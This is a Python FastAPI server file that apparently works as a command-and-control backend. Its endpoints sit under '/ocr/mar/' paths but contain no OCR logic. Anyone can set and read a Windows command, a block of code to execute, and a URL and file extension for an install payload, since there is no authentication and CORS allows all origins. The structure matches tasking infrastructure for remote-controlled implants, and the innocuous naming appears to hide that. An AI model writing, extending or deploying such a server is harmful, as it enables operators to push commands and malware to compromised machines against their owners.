import os # Only if you actually use os-specific functions, otherwise remove
from fastapi import FastAPI, Query, Body
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

# Pydantic model for request body (conventionally PascalCase)
class Script(BaseModel):
    code: str

# --- Global State Variables ---
# IMPORTANT: These are in-memory and will be RESET if your Render service restarts
# (e.g., due to a new deployment, scaling, or platform maintenance).
# For persistent storage, consider using a database (Render offers free PostgreSQL)
# or a key-value store like Redis.

url_file_data = {
    "url_file": None,
    "extention": None
}
code_exe_data = None

dec_data = {
    "option": None,
}

command_data = {
    "windows": None,
}
# --- End Global State Variables ---

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # For production, restrict this to your frontend's domain
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get("/ocr/mar/evente")
def get_evente_status():
    return dec_data

@app.put("/ocr/mar/evente_updat")
def update_evente_status(mise: str = Query(...)):
    global dec_data
    dec_data["option"] = mise
    return dec_data

@app.get("/ocr/mar/command")
def get_command_details():
    return command_data

@app.put("/ocr/mar/command/updat")
def update_command_details(new_command: str = Query(...)):
    global command_data
    command_data["windows"] = new_command
    return command_data

@app.get("/ocr/mar/code")
def get_executable_code():
    return {"code": code_exe_data} # Return as a JSON object for consistency

@app.put("/ocr/mar/code/updat")
def update_executable_code(new_code_payload: Script = Body(...)):
    global code_exe_data
    try:
        code_exe_data = str(new_code_payload.code)
        return {"status": "success", "message": "Code updated successfully.", "updated_code": code_exe_data}
    except Exception as e:
        # In a real app, log the error `e`
        return {"status": "error", "message": f"Failed to update code: {str(e)}"}

@app.get("/ocr/mar/install_file")
def get_install_file_info():
    return url_file_data

@app.put("/ocr/mar/install_file/updat")
def update_install_file_info(url: str = Query(...), extension: str = Query(...)):
    global url_file_data
    url_file_data["url_file"] = url
    url_file_data["extention"] = extension
    return url_file_data

# This line can be helpful for some deployment environments,
# though with `uvicorn main:app`, `app` is directly referenced.
# It doesn't hurt to have it.
application = app

# To run locally (for development):
# uvicorn main:app --reload --port 8000
